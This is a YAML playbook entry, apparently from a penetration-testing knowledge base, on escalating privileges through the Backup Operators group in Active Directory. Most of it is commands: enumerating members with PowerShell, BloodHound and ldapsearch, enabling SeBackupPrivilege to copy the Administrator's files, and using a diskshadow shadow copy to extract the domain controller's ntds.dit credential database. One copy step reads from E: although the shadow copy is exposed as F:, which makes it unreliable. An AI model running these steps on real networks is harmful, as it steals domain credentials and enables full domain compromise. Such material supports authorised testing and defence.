title: Privilege Escalation using Backup Operators AD group privileges
category: 
  - AD:
    - Privileged Groups
    - Privilege Escalation
tactic: Privilege Escalation
tags: []
description: |
  As with Server Operators membership, we can access DCs file system if we belong to Backup Operators.
  This is because this group grants its members the SeBackup and SeRestore privileges. 
  The SeBackupPrivilege allows us to traverse any folder and list the folder contents. 
  This will let us copy a file from a folder, even if nothing else is giving you permissions. 
  However, to abuse this permissions to copy a file the flag FILE_FLAG_BACKUP_SEMANTICS **** must be used. 
  Therefore, special tools are needed.
   
references:
  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges
  - https://github.com/giuliano108/SeBackupPrivilege
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy

steps:
  - description: Enumerate users in privileged AD groups.
    options:
      - tool: powershell_ad_module
        usage: |

          Get-ADGroupMember -Identity "Backup Operators" -Recursive
        comments:
          - You can add "| Measure-Object" to the powershell command to get a total number of the accounts

      - tool: bloodhound
        usage: |
          MATCH (u:User)-[:MemberOf]->(g:Group {name:'BACKUP OPERATORS@DOMAIN.COM'}) return u.name, u.displayname
        comments:
          - domain groups and the domain name should be in uppercase

      - tool: ldapsearch
        usage: |
          ldapsearch -x ldap://<dc_ip> -D "<user@domain.com>" -w '<password>' -b "DC=<domain,DC=com>" -b "(memberOf:1.2.840.113556.1.4.1941:=cn=Backup Operators,cn=Users,dc=hpbank,dc=local)" sAMAccountName | grep sAMAccountName
        comments: 

  - description: Local Attack
    options:
      - tool: SeBackupPrivilege Powershell Scripts
        usage: |
          # Import libraries
          Import-Module .\SeBackupPrivilegeUtils.dll
          Import-Module .\SeBackupPrivilegeCmdLets.dll
          Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

          # Enable SeBackupPrivilege
          Set-SeBackupPrivilege
          Get-SeBackupPrivilege

          # List Admin folder for example and steal a file
          dir C:\Users\Administrator\
          Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
        comments:
        
  - description: AD Attack - Directly access the Domain Controller file system
    options:
      - tool: cmd
        usage: dir \\dc01\C$
        comments:
  
  - description: Steal Local NTDS 
    options:
      - tool: diskshadow
        usage: |
          DISKSHADOW> set verbose on
          DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
          DISKSHADOW> set context clientaccessible
          DISKSHADOW> set context persistent
          DISKSHADOW> begin backup
          DISKSHADOW> add volume C: alias cdrive
          DISKSHADOW> create
          DISKSHADOW> expose %cdrive% F:
          DISKSHADOW> end backup
          DISKSHADOW> exit
        comments:
  
  - description: As in the local attack, you can now copy the privileged file
    options:
      - tool: SeBackupPrivilege Powershell Scripts
        usage: Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
        comments:
      - tool: robocopy
        usage: robocopy /B F:\Windows\NTDS .\ntds ntds.dit
        comments: An MS Tool

comments:

  